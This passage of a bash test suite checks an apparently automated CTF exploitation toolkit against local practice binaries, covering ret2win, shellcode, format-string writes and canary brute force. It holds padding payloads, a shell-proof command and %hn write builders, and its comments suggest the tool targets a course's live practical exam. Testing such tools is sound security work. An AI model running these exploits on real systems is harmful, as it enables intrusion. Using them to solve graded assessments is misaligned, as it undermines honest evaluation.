    got = {(f["kind"], f["value"]) for f in notes.parse(text)}
    if [w for w in want if w not in got] or [f for f in forbid if f in got]:
        bad += 1; print("   MISREAD:", text[:70], "->", sorted(got, key=str))
# a size is not an offset: it becomes a short list, and a stated offset is used as given
assert notes.offsets_from(notes.parse("the buffer is 64 bytes"), 32)[:3] == [68, 72, 76]
assert notes.offsets_from(notes.parse("offset is 76"))[:1] == [76]
sys.exit(1 if bad else 0)
PYNOTES
"$PY" - <<'PYNOTES2' && ok "notes.py: tables, #define, 0b/h-suffix/bare hex, \\x bytes, spelled-out numbers, 'A'*76 - and ordinary prose is left alone" || bad "notes parser (round 24 wordings)"
import sys
sys.path.insert(0, ".")
import notes
CASES = [
    # tables and label/value lines
    ("offset | 76", [("offset", 76)], []),
    ("| win address | 0x401186 |", [("address", 0x401186)], []),
    ("Buffer size:\t64", [("size", 64)], []),
    ("key\t0x1337", [("number", 0x1337)], []),
    # lines of C
    ("#define KEY 0x1337", [("number", 0x1337)], []),
    ("#define BUFSIZE 64", [("size", 64)], []),
    ("unsigned int secret = 0xdeadbeef;", [("number", 0xdeadbeef)], []),
    ("if (p.access_code == 0x1337c0de) win();", [("number", 0x1337c0de)], []),
    ("char buffer[0x40];", [("size", 0x40)], []),
    # other number spellings
    ("The key is 0b1010011.", [("number", 0b1010011)], []),
    ("win is at 080491f6", [("address", 0x080491f6)], []),
    ("jump to 401186h", [("address", 0x401186)], []),
    ("the magic value is deadbeef", [("number", 0xdeadbeef)], []),
    ("Write the bytes \\xef\\xbe\\xad\\xde into the guard.", [("number", 0xdeadbeef)], []),
    # spelled out
    ("The buffer is sixty-four bytes long.", [("size", 64)], []),
    ("It holds thirty two characters.", [("size", 32)], []),
    ("The offset is seventy six.", [("offset", 76)], []),
    ("The buffer is one hundred and twenty eight bytes.", [("size", 128)], []),
    # units other than "bytes"
    ("a 64 character buffer", [("size", 64)], []),
    ("the name field is 32 chars", [("size", 32)], []),
    # padding written as letters
    ("Send 72 A's then the address 0x401196.", [("offset", 72), ("address", 0x401196)], []),
    ("payload = 'A' * 76 + p32(0x080491f6)", [("offset", 76), ("address", 0x080491f6)], []),
    # must NOT over-read ordinary prose
    ("Read all the questions before you begin. You have three hours.", [], [("size", 3), ("number", 3), ("offset", 3)]),
    ("Answer any two of the five questions.", [], [("number", 2), ("number", 5), ("size", 2)]),
    ("Dead or alive, the beef is cafe quality.", [], [("number", 0xdead), ("number", 0xbeef), ("number", 0xcafe)]),
    ("Good luck, and add a face to your name.", [], [("number", 0xadd), ("number", 0xface)]),
]
bad = 0
for text, want, forbid in CASES:
    got = {(f["kind"], f["value"]) for f in notes.parse(text)}
    if [w for w in want if w not in got] or [f for f in forbid if f in got]:
        bad += 1; print("   MISREAD:", text[:70], "->", sorted(got, key=str))
# a value on the next line belongs to the label above it; "1,024" is one number
got = {(f["kind"], f["value"]) for f in notes.parse("The offset is\n76\nThe buffer is 1,024 bytes.\nwin() is at:\n0x401186\n")}
if not {("offset", 76), ("size", 1024), ("address", 0x401186)} <= got or ("size", 24) in got:
    bad += 1; print("   MISREAD multi-line / separators:", sorted(got, key=str))
# a paragraph of exam instructions must yield NOTHING to act on
prose = """CS2212 Ethical Hacking - Practical Test. Duration: three hours. Total 70 marks.
Answer all nine questions. Each flag has the format SIT{...}. Question 6 (8 marks). Buffer overflow.
A service is running on port 5002. It was compiled for a 64-bit machine without stack protection.
Hint: add your payload after the padding, and decide which bytes are bad. One face of the problem is the dead code."""
junk = [(f["kind"], f["value"]) for f in notes.parse(prose)]
if junk:
    bad += 1; print("   PROSE produced facts:", junk)
# the user sees what THEY wrote, not the rewritten line
f = notes.parse("The buffer is sixty-four bytes.")[0]
assert "sixty-four" in f["line"], f
sys.exit(1 if bad else 0)
PYNOTES2
sp(){ # sp <clone> <port> <files: bin|src|none> <flag> <label> <notes text>
  local P nf; P=$(srv "$1" "$2"); waitport "$2"
  nf=$(mktemp /tmp/paper_XXXXXX.txt); printf '%s\n' "$6" > "$nf"
  case $3 in bin) f="testbed/$1";; src) f="testbed/src/$1.c";; *) f="";; esac
  timeout 200 "$PY" go.py 127.0.0.1 "$2" $f "$nf" </dev/null 2>/dev/null | tr -d '\0' | grep -qF "$4" && ok "$5" || bad "$5"
  rm -f "$nf"; stop "$P"
}
# Without the notes each of these is unsolvable: the value is read from a file at run time.
P=$(srv papercode32 35201); waitport 35201
timeout 120 "$PY" solve.py 127.0.0.1 35201 --binary testbed/papercode32 --run --timeout 60 2>/dev/null | grep -q "SIT{th3_c0d3_w4s_0n_th3_p4p3r}" \
  && bad "papercode32 solved WITHOUT the paper's value - the fixture no longer tests anything" || ok "no notes: the out-of-band code cannot be found (as it should be)"
stop "$P"
sp papercode32  35202 bin  "SIT{th3_c0d3_w4s_0n_th3_p4p3r}"    "guard value from the notes"                  "The access code for this terminal is 0x5eaf00d5."
sp papercode32  35203 src  "SIT{th3_c0d3_w4s_0n_th3_p4p3r}"    "same, source only"                           "The code you need is 0x5eaf00d5"
sp paperkey32   35204 bin  "SIT{k3y_c0mput3d_fr0m_th3_n0t3s}"  "win(key): the key is a SUM in a paragraph"   "Question 4 (15 marks). The function only prints the flag when called with the right key. The key is the sum 0x1000 + 0x337. Overflow the 40-byte buffer to call it."
sp paperlogin32 35205 bin  "SIT{cr3d3nt14ls_fr0m_th3_h4nd0ut}" "login from the notes, then ret2win"          "Username: examuser   Password: Wint3r-2026"
sp varsrc       35206 none "SIT{var_from_source}"              "no files at all: code from the notes, sprayed" "Question 2. The access code is 0x1337c0de."
W32=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/shellwin32').win_symbols['win']))")
W64=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/shellwin64').win_symbols['win']))")
sp shellwin32   35207 none "SIT{w1n_1s_4_sh3ll_typ3_c4t}"      "no files: buffer SIZE and win() address from the notes, 32-bit" "The buffer is 48 bytes. win() is at $W32."
sp shellwin64   35208 none "SIT{sh3ll_w1n_64_4l1gn3d}"         "no files, 64-bit: aligned without a gadget (+1 / +5)"         "The buffer is 48 bytes long and win() is located at $W64."
# THE PROFESSOR'S OWN WORDING: live 5002 printed this block in its banner. Here it is on
# the "paper" instead, verbatim (only the win() address is this clone's), with no files.
WL=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/paperlab64').win_symbols['win']))")
sp paperlab64   35213 none "SIT{pr0f3ss0rs_0wn_w0rd1ng_0n_p4p3r}" "the professor's 5002 banner moved to the paper, verbatim, no files" "$(printf '=== STACK LAB: Watch a buffer overflow happen ===\nbuffer:        0x7ffc72e57840\nsaved RIP:     0x7ffc72e57868\nwin():         %s\noffset to RIP: 40 bytes\n\nMission: replace the saved RIP with win()' $WL)"
"$PY" - <<'PYPROF' && ok "his block reads as: offset 40, one code address, two stack addresses (not return targets)" || bad "professor's wording misread"
import sys
sys.path.insert(0, ".")
import notes
fs = notes.parse("=== STACK LAB: Watch a buffer overflow happen ===\nbuffer:        0x7ffc72e57840\nsaved RIP:     0x7ffc72e57868\nwin():         0x401186\noffset to RIP: 40 bytes\n\nMission: replace the saved RIP with win()")
got = sorted((f["kind"], f["value"]) for f in fs)
assert got == [("address", 0x401186), ("address", 0x7ffc72e57840), ("address", 0x7ffc72e57868), ("offset", 40)], got
PYPROF
# Live 5003's shape with its binary withheld: the paper gives the jmp esp address and the
# offset in words. An address on paper is not always a win() - it may be a trampoline.
JE=$("$PY" -c "from elftool import ELF; e=ELF('testbed/chatty_echo'); print(hex(e.gadgets()['jmp esp'][0]))")
JO=$("$PY" -c "from elftool import ELF; e=ELF('testbed/chatty_echo'); print(e.report()['ret_offset_candidates'][0])")
sp chatty_echo  35214 none "SIT{chatty_echo_shift}" "no binary: 'jmp esp is at ..., offset N' in the notes -> shellcode behind it" "The stack is executable. jump_to_stack (a jmp esp) is at $JE. The offset to the return address is $JO."
sp chatty_echo  35215 none "SIT{chatty_echo_shift}" "same with no technique words: ret2win reading fails, shellcode reading follows" "jump_to_stack: $JE   offset $JO"
JN=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/nameecho32').gadgets()['jmp esp'][0]))")
sp nameecho32   35234 none "SIT{sh3llc0d3_4ft3r_th3_n4m3}" "no binary: jmp esp + offset in the notes, and a harmless Name prompt first" "The stack is executable. jump_to_stack (a jmp esp) is at $JN. The offset to the return address is 164."
WQ=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/paperquiet64').win_symbols['win']))")
sp paperquiet64 35235 none "SIT{p4p3r_w1n_b3h1nd_4_pr0mpt}" "no binary, Name prompt first: win() and the exact offset in the notes" "win() is at $WQ. The offset to the return address is 248 bytes."
sp paperquiet64 35236 none "SIT{p4p3r_w1n_b3h1nd_4_pr0mpt}" "same, notes give only the buffer SIZE (another variable sits in between: size+48)" "win(): $WQ   buffer is 200 bytes"
sp paperquiet64 35237 none "SIT{p4p3r_w1n_b3h1nd_4_pr0mpt}" "same, notes give ONLY the address: the distance is found on the wire" "win() is at $WQ"
# The failure report itself, behind a prompt and with nothing given: its READ THIS FIRST
# command must work when pasted with the real address (it used to omit the prompt walk).
P=$(srv paperquiet64 35238); waitport 35238
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35238 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
echo "$O" | grep -q "RANKED CANDIDATES - ALL TRIED" && ! echo "$O" | grep -q "RANKED CANDIDATES (not run)\|NOT SOLVED" \
  && ok "after a full failed run the list says it WAS tried, not 'not run'" || bad "failure report still says the candidates were not run"
echo "$O" | grep -q "Easiest: run  python3 go.py" && ok "the diagnosis names the no-flags route first" || bad "diagnosis lacks the go.py route"
LINE=$(echo "$O" | grep -a -- '--addr 0xWIN' | tail -1 | sed "s/^\[!\] *//; s/0xWIN/$WQ/")
timeout 90 bash -c "$LINE" 2>/dev/null | tr -d '\0' | grep -qF "SIT{p4p3r_w1n_b3h1nd_4_pr0mpt}" \
  && ok "the diagnosis command, pasted with the real address, solves it (prompt walk included)" || bad "pasted diagnosis command does not solve"
stop "$P"
# 5001's source, typed in as notes because it was on paper rather than in a file
sp varsrc       35216 none "SIT{var_from_source}" "5001's C snippet pasted as notes, no files" "$(printf 'struct player {\n    char name[32];\n    unsigned int access_code;\n};\nif (p.access_code == 0x1337c0de) {\n    win();\n}')"
# Notes that CONTRADICT the binary: still solved (the binary's layout goes first), and the
# disagreement is said out loud - wrong question's notes, or a different build on the server.
P=$(srv shellwin32 35217); waitport 35217
nf=$(mktemp /tmp/paper_XXXXXX.txt); echo "The offset is 76 and win() is at 0x08049999." > "$nf"
O=$(timeout 200 "$PY" solve.py 127.0.0.1 35217 --binary testbed/shellwin32 --notes "$nf" --run 2>&1 | tr -d '\0')
rm -f "$nf"; stop "$P"
echo "$O" | grep -qF "SIT{w1n_1s_4_sh3ll_typ3_c4t}" && ok "contradictory notes: still solved from the binary" || bad "contradictory notes derailed a solvable challenge"
{ echo "$O" | grep -q "your notes say offset 76; this binary's own layout says" && echo "$O" | grep -q "your notes give the address 0x8049999"; } \
  && ok "the disagreement between notes and binary is stated" || bad "notes/binary disagreement not reported"
# One notes file covering TWO questions: the right pair is found among them.
WL2=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/paperlab64').win_symbols['win']))")
sp paperlab64   35218 none "SIT{pr0f3ss0rs_0wn_w0rd1ng_0n_p4p3r}" "one notes file for two questions (two addresses, two offsets)" "$(printf 'Question 5: win(): 0x401999   offset to RIP: 72 bytes\nQuestion 6: win(): %s   offset to RIP: 40 bytes' $WL2)"
# The lab's FORMAT-STRING exercises with the address on paper and NO binary (each was a
# 180 s failure): %s read of a global, %n to non-zero, exact %hn value, GOT -> win().
A1=$(nm testbed/fmtglobal32 | awk '$3=="flag"{print "0x"$1}'); A2=$(nm testbed/fmtglobal64 | awk '$3=="flag"{print "0x"$1}')
A3=$(nm testbed/fmtnonzero32 | awk '$3=="target"{print "0x"$1}'); A4=$(nm testbed/fmttarget64 | awk '$3=="target"{print "0x"$1}')
sp fmtglobal32  35219 none "$(cat testbed/flags/fmtglobal32.txt)"  "fmt, no binary: 'the secret is stored at ADDR' -> %s read" "The secret is stored at $A1."
sp fmtglobal64  35220 none "$(cat testbed/flags/fmtglobal64.txt)"  "same, 64-bit (address after the format)" "The flag is stored at address $A2. Read it."
sp fmtnonzero32 35221 none "$(cat testbed/flags/fmtnonzero32.txt)" "fmt, no binary: 'make the variable at ADDR non-zero' -> %n" "The variable target is at $A3. Make it non-zero."
sp fmttarget64  35222 none "$(cat testbed/flags/fmttarget64.txt)"  "fmt, no binary: 'ADDR must equal 0xDEADBEEF' -> exact write" "target is at $A4. It must equal 0xDEADBEEF."
GW=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/fmtgotwin32').win_symbols['win']))"); GP=$(objdump -R testbed/fmtgotwin32 | awk '/ puts@/{print "0x"$1}')
sp fmtgotwin32  35223 none "$(cat testbed/flags/fmtgotwin32.txt)"  "fmt, no binary: GOT entry and win() both on paper" "The GOT entry of puts is at $GP. win() is at $GW."
# A canary changes every run, so one written on paper is stale: it must not derail the leak.
sp fmtcanary64  35224 bin "$(cat testbed/flags/fmtcanary64.txt)" "a stale 'canary: 0x...' line in the notes does not derail the real leak" "canary: 0x1122334455667700  offset 72"
! grep -q 'scripts/' solve.py verify.py auto_pwn.py fmtpwn.py ret2shell.py ret2libc.py go.py notes.py \
  && ok "no tool prints a path into the old scripts/ folder" || bad "a tool still names scripts/"
# Notes must never make things WORSE: irrelevant numbers, and a note that says nothing.
sp adjone32     35209 bin  "SIT{l3v3l_must_b3_3x4ctly_1}"      "irrelevant numbers in the notes do not derail a solvable challenge" "Exam ends at 1700 in room 204. Question 3 is worth 10 marks."
sp fmtsmall32   35210 bin  "SIT{sm4ll_v4lu3_n33ds_t41l_4ddr}"  "notes with nothing useful: same result as no notes"           "Good luck! No hints for this one."
# A WRONG value on the paper must end in an honest failure, not a crash and not a flag.
P=$(srv papercode32 35211); waitport 35211
nf=$(mktemp /tmp/paper_XXXXXX.txt); echo "The access code is 0x11112222." > "$nf"
O=$(timeout 200 "$PY" solve.py 127.0.0.1 35211 --binary testbed/papercode32 --notes "$nf" --run --timeout 60 2>&1); RC=$?
rm -f "$nf"; stop "$P"
{ [ "$RC" = 2 ] && ! echo "$O" | grep -q "SOLVED\|Traceback"; } && ok "a wrong value in the notes: tried, failed honestly (exit 2)" || bad "wrong notes value (exit $RC)"
# The no-arguments mode: it ASKS. Answers are fed on stdin exactly as a person would type them.
P=$(srv papercode32 35212); waitport 35212
printf '127.0.0.1\n35212\ntestbed/papercode32\n\nthe access code is 0x5eaf00d5\n\n' | timeout 200 "$PY" go.py 2>/dev/null \
  | grep -q "SIT{th3_c0d3_w4s_0n_th3_p4p3r}" && ok "go.py with no arguments: asks host, port, file, notes - and solves" || bad "go.py question mode"
stop "$P"

say "KNOWN LIMIT, honestly reported: PIE with a single printf"
P=$(srv fmtpieone64 35242); waitport 35242
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35242 --binary testbed/fmtpieone64 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
stop "$P"
! echo "$O" | grep -q "SOLVED\|SIT{0n3_pr1ntf_n0t_3n0ugh}" && ok "PIE + one printf: not reported as solved" || bad "fmtpieone64 reported SOLVED"
echo "$O" | tail -8 | grep -q "DIAGNOSIS: this IS a format-string bug, but the binary is PIE" \
  && ok "PIE + one printf: the run ENDS by saying why (leak OR write, not both)" || bad "no closing diagnosis for PIE + single printf"
echo "$O" | grep -q "Ctrl-C if that already answers it" && echo "$O" | grep -q "skipped: the diagnosis above rules out format-string writes" \
  && ok "...and says so as soon as it knows (not only at the end); the ruled-out %n attempt is skipped" || bad "diagnosis not announced early / ruled-out write still run"
N1=$(echo "$O" | grep -n "Ctrl-C if that already answers it" | head -1 | cut -d: -f1); N2=$(echo "$O" | grep -n "^READ THIS FIRST" | head -1 | cut -d: -f1)
[ -n "$N1" ] && [ -n "$N2" ] && [ "$N1" -lt 40 ] && [ "$N2" -gt "$N1" ] && ok "the early notice is within the first 40 lines" || bad "early notice is not early (line $N1 vs $N2)"

say "CTRL-C keeps the diagnosis; random stack bytes are not a flag"
P=$(srv fmtpieone64 35243); waitport 35243
"$PY" - 35243 <<'PYINT' && ok "Ctrl-C 35 s into a failing run: exits, no traceback, READ THIS FIRST still printed, nothing claimed" || bad "Ctrl-C loses the diagnosis (or claims a flag)"
import os, re, signal, subprocess, sys, time
p = subprocess.Popen([sys.executable, "solve.py", "127.0.0.1", sys.argv[1], "--binary", "testbed/fmtpieone64", "--run"],
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=dict(os.environ, PYTHONUNBUFFERED="1"),
                     start_new_session=True, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.default_int_handler))
time.sleep(35)
os.killpg(p.pid, signal.SIGINT)
out, _ = p.communicate(timeout=20)
t = re.sub(r"\x1b\[[0-9;]*m", "", out.decode("latin-1"))
assert p.returncode not in (0, None), p.returncode
assert "Traceback" not in t and "SOLVED" not in t and "[+] FLAG" not in t, t[-400:]
assert re.search(r"^READ THIS FIRST", t, re.M) and "DIAGNOSIS: this IS a format-string bug" in t.split("stopped by Ctrl-C")[-1], t[-600:]
PYINT
stop "$P"
"$PY" - <<'PYFLAG' && ok "a 'flag' with non-printable bytes between the braces is rejected; real flags still match" || bad "flag pattern accepts raw bytes (or rejects a real flag)"
import sys
sys.path.insert(0, ".")
import flags
get = lambda d: flags.find_flag(d, None, strong_only=True)
for junk in (b"xk{\xa7`k{\xa7`r}", b"junk xk{\xc2\xa7`k{\xc2\xa7`r} more", b"ab{\x00\x01\x02}"):
    assert not get(junk), (junk, get(junk))
for real in (b"SIT{f0rm@t_5trings}", b"SIT{764c6759dc7d87cf27f5cd043e167e77}", b"FLAG{h3ld_0ut_6_nx_never_reached}", b"SIT{G0t_@_R3V_SHELL}", b"picoCTF{a b c!}"):
    assert get(b"x " + real + b"\n") == real.decode(), (real, get(real))
PYFLAG

say "NEGATIVE: a service that prints each WORD of the input on its own line is not a shell"
for mode in bin none; do
  [ $mode = bin ] && { PT=35244; FILES="--binary testbed/tokecho32"; } || { PT=35245; FILES=""; }
  P=$(srv tokecho32 $PT); waitport $PT
  O=$(timeout 260 "$PY" solve.py 127.0.0.1 $PT $FILES --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0'); RC=$?
  stop "$P"
  ! echo "$O" | grep -q "SOLVED\|shell confirmed" && ok "tokecho32 ($mode): no shell claimed, nothing SOLVED" || bad "tokecho32 ($mode): a word-splitting echo was reported as a shell"
done
"$PY" - <<'PYPROOF' && ok "shell evidence is a computed value: echoes, word-splits and reversals of our command do not count" || bad "shell_confirmed accepts text an echo can produce"
import sys
sys.path.insert(0, ".")
import flags
cmd = flags.with_proof("echo ===SHELL===; id; cat flag*")
assert flags.PROOF_OUT not in cmd
for fake in ("You said: " + cmd, "\n".join(cmd.replace(";", " ").split()), cmd[::-1], "===SHELL===\n", "tokens:\necho\n===SHELL===\nid\n"):
    assert not flags.shell_confirmed(fake), fake[:40]
assert flags.shell_confirmed("===SHELL===\nuid=1000(ctf) gid=1000(ctf)\n") and flags.shell_confirmed("x\n" + flags.PROOF_OUT + "\n")
PYPROOF

say "NEGATIVE: a flag-shaped EXAMPLE in the reply to a harmless input is not the flag"
for mode in bin none; do
  [ $mode = bin ] && { PT=35246; FILES="--binary testbed/hintreply32"; } || { PT=35247; FILES=""; }
  P=$(srv hintreply32 $PT); waitport $PT
  O=$(timeout 260 "$PY" solve.py 127.0.0.1 $PT $FILES --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
  stop "$P"
  ! echo "$O" | grep -q "SOLVED\|^\[+\] FLAG" && ok "hintreply32 ($mode): the example in the reply is not reported as the flag" || bad "hintreply32 ($mode): an example was reported as the flag"
  echo "$O" | tail -8 | grep -q "answers a HARMLESS input with flag-shaped text: SIT{example_flag_here}" \
    && ok "hintreply32 ($mode): the run ends by saying what it saw and why it does not count" || bad "hintreply32 ($mode): no closing explanation"
done

say "NEGATIVE: the same example behind a REAL format-string bug (the format engine's path)"
for mode in bin none; do
  [ $mode = bin ] && { PT=35249; FILES="--binary testbed/fmtexample32"; } || { PT=35250; FILES=""; }
  P=$(srv fmtexample32 $PT); waitport $PT
  O=$(timeout 260 "$PY" solve.py 127.0.0.1 $PT $FILES --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
  stop "$P"
  ! echo "$O" | grep -q "SOLVED\|^\[+\] FLAG" && ok "fmtexample32 ($mode): the example is not reported as the flag" || bad "fmtexample32 ($mode): an example was reported as the flag"
done

say "NEGATIVE: a random hex SESSION ID in every reply is not a flag"
for mode in bin none; do
  [ $mode = bin ] && { PT=35251; FILES="--binary testbed/fmtsession32"; } || { PT=35252; FILES=""; }
  P=$(srv fmtsession32 $PT); waitport $PT
  O=$(timeout 260 "$PY" solve.py 127.0.0.1 $PT $FILES --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
  stop "$P"
  ! echo "$O" | grep -q "SOLVED\|^\[+\] FLAG" && ok "fmtsession32 ($mode): the session id is not reported as the flag" || bad "fmtsession32 ($mode): a session id was reported as the flag"
done
"$PY" - <<'PYHEX' && ok "a bare-hex flag is still found when the service prints no such token unprovoked - and skipped by SHAPE when it does" || bad "bare-hex shape rule wrong"
import sys
sys.path.insert(0, ".")
import flags
real = "764c6759dc7d87cf27f5cd043e167e77"
assert flags.find_flag("you win: " + real + "\n") == real
flags.learn_ignore("Logged. session=0123456789abcdef0123456789abcde0\n")      # a harmless reply
assert flags.find_flag("you win: " + real + "\n") is None                        # same shape: furniture
assert flags.find_flag("you win: SIT{" + real + "}\n") == "SIT{" + real + "}"    # a wrapped flag is unaffected
PYHEX

say "NEGATIVE: a polite LENGTH CHECK is not diagnosed as a stack overflow"
P=$(srv lencheck32 35253); waitport 35253
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35253 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
stop "$P"
! echo "$O" | grep -q "SOLVED\|^\[+\] FLAG" && ok "lencheck32: nothing claimed" || bad "lencheck32: something was claimed on a program with no bug"
echo "$O" | grep -q "makes the service ANSWER DIFFERENTLY - it says .*Too long - rejected" && ! echo "$O" | grep -q "bytes CRASHES the service" \
  && ok "lencheck32: the diagnosis quotes the refusal and does not call it a crash" || bad "lencheck32: a length check was called a stack overflow"

say "CYCLIC: the start of our own input, printed back as a number, is not a leaked return address"
P=$(srv taghex32 35254); waitport 35254
O=$(timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 35254 --goal ret2win --cyclic 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
stop "$P"
echo "$O" | grep -q "is the START of our own input" && ! echo "$O" | grep -q "use --offset 0" \
  && ok "taghex32: the echoed tag is recognised and not announced as offset 0" || bad "taghex32: cyclic took an echoed tag for a return address"
echo "$O" | grep -qF "SIT{t4g_1s_n0t_th3_r3turn_4ddr}" && ok "taghex32: the same attempt goes on to find the real offset and the flag" || bad "taghex32: cyclic attempt dead-ends after a wrong hit"

say "CANARY BRUTE FORCE: the survival line is printed BEFORE the check"
( cd testbed && exec ./canarysay32 20203 >/dev/null 2>&1 ) & CS=$!; waitport 20203
O=$(timeout 300 "$PY" auto_pwn.py --host 127.0.0.1 --port 20203 --binary testbed/canarysay32 --goal ret2win --offset 80 \
    --brute-canary --send-mode raw --idle 0.05 --timeout 1.0 --max-attempts 400 2>&1 | tr -d '\0')
kill "$CS" 2>/dev/null; wait "$CS" 2>/dev/null
echo "$O" | grep -qF "SIT{c4n4ry_s41d_b3f0r3_ch3ck}" && ! echo "$O" | grep -q "canary = 0x0$" \
  && ok "canarysay32: glibc's abort message is the signal - real canary, flag (was: 'canary = 0x0')" || bad "canarysay32: canary brute force fooled by a line printed before the check"
( cd testbed && exec ./canarymute32 20204 >/dev/null 2>&1 ) & CS=$!; waitport 20204
O=$(timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 20204 --binary testbed/canarymute32 --goal ret2win --offset 80 \
    --brute-canary --send-mode raw --idle 0.05 --timeout 1.0 --max-attempts 400 2>&1 | tr -d '\0')
kill "$CS" 2>/dev/null; wait "$CS" 2>/dev/null
echo "$O" | grep -q "two DIFFERENT first bytes both 'survive'" && ! echo "$O" | grep -q "brute-canary: canary = \|^\[+\] FLAG" \
  && ok "canarymute32: no signal at all - says so, invents no canary" || bad "canarymute32: a canary was invented with nothing to observe"

say "...and the mirror image: a REAL flag printed for any input is handed to the user, plainly"
P=$(srv freeflag32 35248); waitport 35248
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35248 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
stop "$P"
echo "$O" | tail -8 | grep -q "your flag is:   SIT{just_c0nn3ct_4nd_typ3}" \
  && ok "freeflag32: the run ends with the candidate flag on a line of its own" || bad "freeflag32: the user is not left holding the flag"

say "FUZZ: junk is not a flag (address dumps and random bytes through every decoder)"
# 50,000 realistic junk inputs. Strict mode is what every format-string path uses; it once
# accepted hex-decoded stack bytes and base64-decoded address dumps as flags.
O=$("$PY" testbed/fuzzflags.py 50000 2>&1)
echo "$O" | grep -q "^strong_only=True: 0 accepted" && ok "strict flag matching: 0 of 50,000 junk inputs accepted" || { bad "junk accepted as a flag"; echo "$O" | head -8; }
"$PY" - <<'PYDIS' && ok "real flags still decode when hex-encoded, reversed, base64 or rot13" || bad "a real disguised flag is no longer found"
import base64, codecs, sys
sys.path.insert(0, ".")
import flags
real = "SIT{d1sgu1s3d_but_r34l}"
for how, txt in (("hex-encoded", "here: " + real.encode().hex()), ("reversed", "out: " + real[::-1]),
                 ("base64", "token " + base64.b64encode(real.encode()).decode()),
                 ("rot13", codecs.encode("the flag: " + real, "rot13"))):
    r = flags.decode_and_find(txt, None, strong_only=True)
    f = r[0] if isinstance(r, tuple) else r
    assert f == real and flags.LAST_HOW == how, (how, f, flags.LAST_HOW)
PYDIS

say "KNOWN LIMIT, honestly reported: a login whose password is nowhere to be found"
# paperlogin32 without its notes: the password exists only on the "paper". The run must not
# claim success and must END by saying what is missing and the no-flags way to supply it.
P=$(srv paperlogin32 35241); waitport 35241
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35241 --binary testbed/paperlogin32 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
stop "$P"
! echo "$O" | grep -q "SOLVED" && ok "unknown login: not reported as solved" || bad "paperlogin32 solved without its notes?"
echo "$O" | tail -8 | grep -q "DIAGNOSIS: the service asks for a login" && echo "$O" | tail -8 | grep -q "python3 go.py  again and type it as notes" \
  && ok "unknown login: the run ENDS by saying the password must come from elsewhere, and how to give it" || bad "no closing diagnosis for an unknown login"

say "ARITHMETIC: a %hn half near zero is written LAST (was ~129 KB of padding, 1 run in 16)"
# system() lands on xxxx0000 one run in sixteen. Written first, that half needs a 64 KB wrap
# and the other another 63 KB; the reply was missed and GOT->system failed ~1 run in 10-16.
"$PY" - <<'PYARITH' && ok "fmtwrite + fmtpwn: every edge value writes correctly in under 70 KB of padding" || bad "half-write ordering regressed"
import re, sys
sys.path.insert(0, ".")
import fmtwrite as fw, fmtpwn as fp
VALS = (0xf7d00000, 0xf7d00004, 0, 0x0007f7d0, 0xf7d0f7d0, 0xf7cc1000, 0x12345678, 0xffff0000, 0x0000ffff, 0x00010002)
for v in VALS:
    p, _ = fw.build(0x804b274, v, 4)
    n, w = 8, {}
    for pad, slot in re.findall(rb"(?:%(\d+)c)?%(\d+)\$hn", p[8:]):
        n += int(pad or 0); w[int(slot)] = n & 0xffff
    assert w.get(4) == v & 0xffff and w.get(5) == v >> 16 and n < 70000, ("fmtwrite", hex(v), w, n)
for bits in (32, 64):
    for base in (0, 10):
        cx = fp.Ctx(None, bits, 7, 0, 400, b"\n")
        for v in VALS:
            writes = cx.split(0x804c018, v, 4, 2)
            p = cx.write_payload(writes, base)
            ws = sorted(writes, key=lambda x: (x[1] - base) % {1: 0x100, 2: 0x10000}[x[2]])
            n, got = base, []
            for pad, _slot, sp in re.findall(rb"(?:%(\d+)c)?%(\d+)\$(hhn|hn)", p):
                n += int(pad or 0); got.append(n & (0xff if sp == b"hhn" else 0xffff))
            assert got == [x[1] & (0xff if x[2] == 1 else 0xffff) for x in ws] and n - base < 70000, ("fmtpwn", bits, base, hex(v), n)
PYARITH

say "KNOWN LIMIT, honestly reported: a format string whose buffer is not on the stack"
P=$(srv fmtglobbuf32 35239); waitport 35239
O=$(timeout 260 "$PY" solve.py 127.0.0.1 35239 --binary testbed/fmtglobbuf32 --run --timeout 200 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\0')
! echo "$O" | grep -q "SOLVED\|SIT{n0t_0n_th3_st4ck}" && ok "the limit is not reported as solved" || bad "fmtglobbuf32 reported SOLVED"
echo "$O" | tail -8 | grep -q "DIAGNOSIS: this IS a format-string bug.*NOT on the stack" \
  && ok "the run ENDS by saying why (buffer not on the stack) under READ THIS FIRST" || bad "no closing diagnosis for a non-stack format buffer"
LINE=$(echo "$O" | grep -a -- '--goal dump   (look' | tail -1 | sed 's/^.*:  python3/python3/; s/   (look.*$//')
timeout 60 bash -c "$LINE" 2>/dev/null | grep -q '%1\$p = 0x' && ok "the dump command it recommends works when pasted" || bad "recommended dump command does not run"
stop "$P"

say "DOCS: the RUNBOOK only names tools that exist HERE"
